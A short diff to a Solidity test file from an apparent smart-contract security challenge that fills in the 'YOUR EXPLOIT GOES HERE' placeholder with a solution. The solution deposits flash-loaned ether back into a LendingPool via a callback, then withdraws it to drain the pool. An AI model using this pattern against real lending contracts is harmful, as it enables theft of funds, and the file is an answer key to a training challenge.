@@ -13,9 +13,14 @@ contract LendingPoolTest is BaseTest {
         instance = new LendingPool{value: 0.1 ether}();
     }
 
-    function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+    function execute() external payable {
+        instance.deposit{value: 0.1 ether}();
+    }
 
+    function testExploitLevel() public {
+        instance.deposit{value: 0.1 ether}();
+        instance.flashLoan(0.1 ether);
+        instance.withdraw();
         checkSuccess();
     }
 
